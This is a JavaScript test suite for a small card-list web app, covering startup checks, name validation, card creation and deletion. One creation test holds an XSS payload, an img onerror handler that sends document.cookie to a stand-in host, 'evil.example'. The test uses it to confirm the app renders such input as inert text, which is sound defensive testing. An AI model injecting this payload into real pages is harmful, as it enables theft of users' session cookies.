import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { ELEMENT_IDS, init } from '../src/app.js';
import { CARD_NAME_MAX_LENGTH } from '../src/cardName.js';
import { createAppDocument, createDomEvent } from './helpers/domStub.js';

const DELETE_BUTTON_SELECTOR = '.card-list__delete';

function submitCard(doc, value) {
	const input = doc.getElementById(ELEMENT_IDS.nameInput);
	input.value = value;
	const event = createDomEvent('submit');
	doc.getElementById(ELEMENT_IDS.form).dispatchEvent(event);
	return event;
}

function cardNames(doc) {
	const list = doc.getElementById(ELEMENT_IDS.list);
	return list.children.map((card) => card.children[0].textContent);
}

function deleteButtons(doc) {
	return doc.getElementById(ELEMENT_IDS.list).querySelectorAll(DELETE_BUTTON_SELECTOR);
}

function clickDelete(doc, index = 0) {
	const buttons = deleteButtons(doc);
	assert.ok(buttons.length > index, 'expected a delete button to click');
	const event = createDomEvent('click');
	buttons[index].dispatchEvent(event);
	return event;
}

function statusText(doc) {
	return doc.getElementById(ELEMENT_IDS.status).textContent;
}

describe('init', () => {
	it('starts on a bare page and reports every missing element', () => {
		const doc = createAppDocument();
		for (const id of [ELEMENT_IDS.list, ELEMENT_IDS.createButton, ELEMENT_IDS.nameInput]) {
			doc.getElementById(id).remove();
		}

		const result = init(doc);

		assert.equal(result.ok, false);
		assert.deepEqual(result.errors, [
			'required element #newCardName was not found',
			'required element #createCard was not found',
			'required element #addTheDamnCard was not found',
		]);
	});

	it('surfaces a startup failure in the status region rather than only in a console', () => {
		const doc = createAppDocument();
		doc.getElementById(ELEMENT_IDS.list).remove();

		init(doc);

		assert.match(statusText(doc), /could not start/);
		assert.equal(doc.getElementById(ELEMENT_IDS.status).className, 'status--error');
	});

	it('works when the optional status region is absent', () => {
		const doc = createAppDocument();
		doc.getElementById(ELEMENT_IDS.status).remove();

		const result = init(doc);

		assert.equal(result.ok, true);
		submitCard(doc, 'Alpha');
		assert.deepEqual(cardNames(doc), ['Alpha']);
	});

	it('rejects a document that is not usable', () => {
		for (const doc of [null, undefined, {}, 'document']) {
			const result = init(doc);
			assert.equal(result.ok, false);
			assert.match(result.errors[0], /no document/);
		}
	});

	it('mirrors the name limit onto the input as maxlength', () => {
		const doc = createAppDocument();

		init(doc);

		assert.equal(
			doc.getElementById(ELEMENT_IDS.nameInput).getAttribute('maxlength'),
			String(CARD_NAME_MAX_LENGTH),
		);
	});

	it('registers exactly one click listener on the list', () => {
		const doc = createAppDocument();

		init(doc);
		submitCard(doc, 'Alpha');
		submitCard(doc, 'Beta');
		submitCard(doc, 'Gamma');

		// The original code re-attached deleteCard to every existing button on
		// every create click, so the first button ended up with N handlers and a
		// single click tried to remove the card N times.
		assert.equal(doc.getElementById(ELEMENT_IDS.list).listenerCount('click'), 1);
	});
});

describe('creating cards', () => {
	it('renders a card for a submitted name', () => {
		const doc = createAppDocument();
		const result = init(doc);

		const event = submitCard(doc, 'Alpha');

		assert.equal(event.defaultPrevented, true, 'the form must never navigate');
		assert.equal(result.ok, true);
		assert.deepEqual(cardNames(doc), ['Alpha']);
		assert.equal(result.store.size(), 1);
	});

	it('clears the input and reports success', () => {
		const doc = createAppDocument();
		init(doc);

		submitCard(doc, 'Alpha');

		assert.equal(doc.getElementById(ELEMENT_IDS.nameInput).value, '');
		assert.equal(statusText(doc), 'Added card "Alpha".');
		assert.equal(doc.getElementById(ELEMENT_IDS.status).className, 'status');
	});

	it('keeps the list in order across multiple submissions', () => {
		const doc = createAppDocument();
		init(doc);

		submitCard(doc, 'Alpha');
		submitCard(doc, 'Beta');
		submitCard(doc, 'Gamma');

		assert.deepEqual(cardNames(doc), ['Alpha', 'Beta', 'Gamma']);
	});

	it('renders a markup payload as inert text and never as a node', () => {
		const doc = createAppDocument();
		init(doc);
		const payload = '<img src=x onerror="fetch(\'//evil.example?\'+document.cookie)">';

		submitCard(doc, payload);

		const list = doc.getElementById(ELEMENT_IDS.list);
		assert.deepEqual(cardNames(doc), [payload]);
		assert.equal(list.querySelectorAll('img').length, 0);
		// Exactly the card container, its heading and its delete button — no nodes
		// were created out of the payload itself.
		assert.equal(list.querySelectorAll('*').length, 3);
	});

	it('refuses an empty name and leaves the input alone for correction', () => {
		const doc = createAppDocument();
		const result = init(doc);

		submitCard(doc, '   ');

		assert.equal(result.store.size(), 0);
		assert.deepEqual(cardNames(doc), []);
		assert.match(statusText(doc), /Enter a card name/);
		assert.equal(doc.getElementById(ELEMENT_IDS.status).className, 'status--error');
		assert.equal(doc.getElementById(ELEMENT_IDS.nameInput).value, '   ');
		assert.match(doc.getElementById(ELEMENT_IDS.nameInput).validity.customErrorMessage, /Enter a card name/);
	});

	it('refuses an over-long name and records the constraint on the input', () => {
		const doc = createAppDocument();
		const result = init(doc);

		submitCard(doc, 'a'.repeat(CARD_NAME_MAX_LENGTH + 1));

		assert.equal(result.store.size(), 0);
		assert.match(statusText(doc), /limited to 80 characters/);
		assert.match(doc.getElementById(ELEMENT_IDS.nameInput).validity.customErrorMessage, /limited to 80 characters/);
	});

	it('clears a previous validation error once a valid card is added', () => {
		const doc = createAppDocument();
		init(doc);

		submitCard(doc, '');
		submitCard(doc, 'Alpha');

		assert.equal(doc.getElementById(ELEMENT_IDS.nameInput).validity.customErrorMessage, '');
		assert.deepEqual(cardNames(doc), ['Alpha']);
	});
});

describe('deleting cards', () => {
	it('removes the clicked card from the page and from the store', () => {
		const doc = createAppDocument();
		const result = init(doc);
		submitCard(doc, 'Alpha');
		submitCard(doc, 'Beta');

		clickDelete(doc, 0);

		assert.deepEqual(cardNames(doc), ['Beta']);
		assert.equal(result.store.size(), 1, 'state must not keep the deleted card');
		assert.equal(result.store.getById(1), null);
		assert.match(statusText(doc), /Deleted card "Alpha"/);
	});

	it('removes a middle card without disturbing the ids of the others', () => {
		// Regression guard: the original code derived element ids from the array
		// index, so deleting the first card made the second button delete the
		// wrong element.
		const doc = createAppDocument();
		init(doc);
		submitCard(doc, 'Alpha');
		submitCard(doc, 'Beta');
		submitCard(doc, 'Gamma');

		clickDelete(doc, 1);

		assert.deepEqual(cardNames(doc), ['Alpha', 'Gamma']);
		assert.deepEqual(deleteButtons(doc).map((button) => button.getAttribute('data-card-id')), ['1', '3']);
	});

	it('deletes exactly one card per click however many exist', () => {
		const doc = createAppDocument();
		init(doc);
		submitCard(doc, 'Alpha');
		submitCard(doc, 'Beta');
		submitCard(doc, 'Gamma');

		clickDelete(doc, 0);

		assert.equal(doc.getElementById(ELEMENT_IDS.list).children.length, 2);
	});

	it('handles deleting every card down to an empty list', () => {
		const doc = createAppDocument();
		const result = init(doc);
		submitCard(doc, 'Alpha');
		submitCard(doc, 'Beta');

		clickDelete(doc, 0);
		clickDelete(doc, 0);

		assert.deepEqual(cardNames(doc), []);
		assert.equal(result.store.size(), 0);
	});

	it('ignores clicks on the card body rather than the delete control', () => {
		const doc = createAppDocument();
		const result = init(doc);
		submitCard(doc, 'Alpha');

		const heading = doc.getElementById(ELEMENT_IDS.list).children[0].children[0];
		heading.dispatchEvent(createDomEvent('click'));

		assert.deepEqual(cardNames(doc), ['Alpha']);
		assert.equal(result.store.size(), 1);
	});

	it('ignores a delete control that carries an unusable id', () => {
		const doc = createAppDocument();
		init(doc);
		submitCard(doc, 'Alpha');

		const button = deleteButtons(doc)[0];
		button.setAttribute('data-card-id', 'not-a-number');
		button.dispatchEvent(createDomEvent('click'));

		assert.deepEqual(cardNames(doc), ['Alpha']);
	});

	it('reports an unknown id rather than throwing', () => {
		const doc = createAppDocument();
		init(doc);
		submitCard(doc, 'Alpha');

		const button = deleteButtons(doc)[0];
		button.setAttribute('data-card-id', '404');
		button.dispatchEvent(createDomEvent('click'));

		assert.match(statusText(doc), /no longer exists/);
		assert.equal(doc.getElementById(ELEMENT_IDS.status).className, 'status--error');
	});
});

describe('the no-form fallback', () => {
	it('wires the create button directly when the page has no form element', () => {
		// The ids required by init must keep working for anyone embedding the
		// script in their own markup without a <form>.
		const doc = createAppDocument();
		doc.getElementById(ELEMENT_IDS.form).remove();

		const input = doc.createElement('input');
		input.id = ELEMENT_IDS.nameInput;
		const button = doc.createElement('button');
		button.id = ELEMENT_IDS.createButton;
		doc.body.appendChild(input);
		doc.body.appendChild(button);

		init(doc);

		input.value = 'Alpha';
		button.dispatchEvent(createDomEvent('click'));

		assert.deepEqual(cardNames(doc), ['Alpha']);
		assert.equal(button.type, 'button');
	});
});
